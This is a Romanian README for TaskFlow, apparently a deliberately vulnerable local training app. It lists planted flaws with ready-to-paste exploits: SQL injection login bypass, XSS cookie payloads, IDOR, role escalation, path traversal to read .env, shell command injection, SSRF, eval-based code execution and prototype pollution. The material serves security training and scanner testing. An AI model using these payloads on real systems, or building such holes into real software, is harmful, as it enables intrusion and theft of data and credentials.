# TaskFlow — ghid de vulnerabilități

Rulează local: `npm install && node server.js` → http://localhost:3000

## Conturi

| Email | Parolă | Rol |
|---|---|---|
| `admin@taskflow.local` | `Admin123!` | admin |
| `demo@taskflow.local` | `password123` | user |

Contul `demo` are deja 2 task-uri seed-uite (id 1 și 2). Contul `admin` pornește fără niciun task — exact ce ai nevoie ca să demonstrezi IDOR-ul de mai jos.

## Cum testezi — 3 moduri, în funcție de ce fel de request e

- **Pentru link-uri (GET)** — login în browser, apoi lipești pur și simplu URL-ul în bara de adrese. Browserul trimite automat cookie-ul de sesiune, deci ești "logat" și acolo.
- **Pentru formulare care există deja în pagină (POST)** — completezi și apeși butonul, exact ca un user normal.
- **Pentru POST-uri care NU au formular în pagină** (eval, prototype pollution) — cel mai simplu e din consola browserului (F12 → tab **Console**), pe orice pagină din aplicație, cât ești logat. Folosești `fetch()`, care trimite automat cookie-ul de sesiune, fără să mai cauți tu cookie-ul manual. Exemplele de mai jos sunt scrise exact așa, gata de lipit în consolă.

---

## Vulnerabilități și mod de exploatare

### 1. SQL Injection — bypass login fără parolă
**Pagină:** `/login` · **Input:** câmpul **Email**
Introdu la email: `admin@taskflow.local' -- ` (atenție la spațiul de după `--`), orice parolă.
Te loghează ca admin fără să știi parola reală — query-ul devine `WHERE email='admin@taskflow.local' -- ' AND password='...'`, iar restul e comentat.

### 2. XSS reflectat — bara de căutare
**Pagină:** `/tasks` · **Input:** câmpul **Caută după titlu**
Caută: `<img src=x onerror="alert(document.cookie)">` — scriptul rulează imediat, reflectat din URL (`?q=...`).

### 3. XSS stocat — comentarii la task
**Pagină:** orice task deschis (`/tasks/:id`) · **Input:** câmpul **Adaugă un comentariu**
Scrie: `<img src=x onerror="alert(document.cookie)">` — oricine deschide acel task execută scriptul (nu doar tu, oricine vede comentariul).

### 4. IDOR — vezi/editezi/ștergi task-uri și comentarii ale altcuiva
**Pași exacți:**
1. Loghează-te ca **admin** (`admin@taskflow.local` / `Admin123!`) — contul ăsta nu are niciun task propriu.
2. Navighează direct la `http://localhost:3000/tasks/1` — ăsta e un task care aparține de fapt lui `demo@taskflow.local`. Îl vezi complet, deși nu ești proprietarul.
3. Încearcă și `http://localhost:3000/tasks/1/edit` — se deschide formularul de editare, deși nu e task-ul tău. Salvează o modificare — chiar se aplică.
4. Din pagina `/tasks/1`, apasă ✕ pe un comentariu care nu e al tău — se șterge, fără nicio verificare de autor.
5. Pentru ștergerea întregului task: din `/tasks` (loghează-te ca admin), apasă „Șterge" pe un rând — dacă știi id-ul unui task străin, poți trimite direct `POST /tasks/1/delete`.

Nicăieri în cod nu se verifică `task.user_id === req.session.user.id` înainte de a afișa, edita sau șterge — de-asta funcționează.

### 5. Mass Assignment — escaladare de rol la înregistrare
**Pagină:** `/register` (formularul nu are câmp de rol, dar backend-ul îl acceptă oricum dacă îl trimiți direct)

Din consola browserului (F12 → Console), pe orice pagină:
```js
fetch('/register', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=atacator@test.local&password=Parola123&role=admin'
}).then(() => location.href = '/tasks');
```
Contul nou creat are deja rol de `admin` — verifică din `/admin/users` (loghează-te ca admin ca să-l vezi).

### 6. Path Traversal — citești orice fișier de pe server
**Pagină:** `/tasks`, cardul **„Task nou"** → secțiunea **„Șablon"**

Funcționalitatea e normală și nu ține de upload: aplicația vine cu 4 șabloane predefinite
(Planificare sprint, Raport de bug, Daily standup, Retrospectivă) ca punct de plecare când scrii
un task nou — alegi unul din dropdown, apeși „Deschide șablonul" și se deschide într-un tab nou
cu textul lui, gata de copiat în descriere.

**Exploit:**
1. Din `/tasks`, selectează orice șablon și apasă „Deschide șablonul". Se deschide un tab nou cu
   un URL de genul `http://localhost:3000/tasks/templates?file=sprint-planning.txt`.
2. În acel tab, editează manual bara de adrese: înlocuiește `file=sprint-planning.txt` cu
   `file=../../../.env`:
   ```
   http://localhost:3000/tasks/templates?file=../../../.env
   ```
3. Cele trei `../` ies din folderul de șabloane (`public/uploads/tasks/`) înapoi în rădăcina
   proiectului și afișează fișierul `.env` cu secretele aplicației (chei API, parole hardcodate).

Problema reală: dropdown-ul trimite doar numele unui șablon valid, dar fiindcă cererea e un
simplu `GET` cu parametru în URL, oricine poate edita manual acel parametru — iar serverul
citește numele fișierului direct din query string, fără să verifice că e unul din cele 4
șabloane permise.

### 7. Path Traversal / nume de fișier nesanitizat — upload avatar
**Pagină:** `/profile`, secțiunea **„Schimbă avatar"** · **Input:** câmpul **Nume fișier**
Numele introdus e folosit brut ca nume de fișier pe disc, fără validare — poți scrie un path cu `../` ca să salvezi fișierul în afara folderului de upload-uri (ex: `../../server.js` ca nume ar încerca să suprascrie un fișier din rădăcina proiectului).

### 8. Command Injection
Login în browser, apoi lipește direct în bara de adrese:
```
http://localhost:3000/profile/convert-avatar?file=default.png;id&format=png
```
Simbolul `;` termină comanda originală (`convert ...`) și execută `id` ca o comandă shell separată pe server (vezi output-ul în terminalul unde rulează `node server.js`, nu în browser).

### 9. SSRF (Server-Side Request Forgery)
Login în browser, apoi lipește direct în bara de adrese:
```
http://localhost:3000/tasks/preview-link?url=http://localhost:3000/health
```
Serverul face el request-ul către URL-ul dat de tine, nu browserul tău — poți încerca și alte adrese interne la care tu, din browser, n-ai acces direct.

### 10. Code Injection prin `eval()`
Din consola browserului (F12 → Console), fiind logat:
```js
fetch('/tasks/calc', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'expression=' + encodeURIComponent("require('child_process').execSync('whoami').toString()")
}).then(r => r.json()).then(console.log);
```
Orice JavaScript trimis acolo se execută direct pe server — rezultatul (numele userului de pe sistemul de operare) apare în consolă.

### 11. Prototype Pollution
Din consola browserului (F12 → Console), fiind logat:
```js
fetch('/profile/preferences', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({__proto__: {polluted: 'da'}})
}).then(r => r.json()).then(console.log);
```
Poluează `Object.prototype` pentru tot procesul Node (exploatează dependența `lodash@4.17.4`) — confirmă rulând `node -e "console.log({}.polluted)"` în terminal, chiar într-o sesiune node separată dacă serverul tot rulează, sau adăugând temporar un `console.log({}.polluted)` undeva în server.js.

### 12. Hash slab pentru parole (MD5, fără salt)
**Unde:** `/admin/users` (coloana „Hash parolă", vizibilă doar adminilor) — parolele sunt stocate ca MD5 simplu, ușor de spart cu un rainbow table (ex: `5f4dcc3b5aa765d61d8327deb882cf99` = `password`).

### 13. Cookie-uri de sesiune nesigure + CORS deschis
Cookie-ul `tf_session` nu are `Secure`/`HttpOnly`/`SameSite`, iar serverul reflectă orice `Origin` cu `Access-Control-Allow-Credentials: true` — verificabil din DevTools → Network → headerele răspunsului, pe orice pagină.

### 14. Lipsă protecție CSRF
Niciun formular POST (adăugare task, comentariu, schimbare status etc.) nu are token CSRF — un site extern poate trimite acele request-uri în numele tău dacă ești logat.

### 15. Stack trace expus la erori
Orice eroare neprinsă afișează stack trace-ul complet în pagină (vezi handler-ul din `server.js`) — încearcă să trimiți date care sparg o interogare SQL (ex. un apostrof nebalansat în titlul unui task).

### 16. Dependențe vulnerabile (SCA)
`package.json` conține intenționat versiuni vechi cu CVE-uri publice: `lodash@4.17.4`, `jsonwebtoken@8.3.0`, `request@2.81.0`, `moment@2.19.3`, `multer@1.3.0`, `xml2js@0.4.19`, `serialize-javascript@1.4.0` — rulează `npm audit` sau Trivy pe folderul proiectului ca să le vezi listate.

### 17. Secrete hardcodate în cod (secret scanning)
Fișierele `.env` și `config.js` conțin chei API (AWS, Stripe, SendGrid), secretul de JWT și parole, scrise direct în sursă — exact ce caută TruffleHog.

---

## Notă — ce e deja reparat
Accesul la `/admin/users` (și la toate rutele `POST /admin/users/...`) e restricționat corect:
doar conturile cu `role = 'admin'` pot accesa panoul de administrare; oricine altcineva primește
`403 Acces interzis`. Linkul „Admin" din meniu nici nu mai apare pentru utilizatorii obișnuiți.
Restul vulnerabilităților din panoul admin (SQL injection pe adăugare/ștergere/schimbare rol)
rămân — doar accesul la rută e acum verificat, nu și conținutul query-urilor.
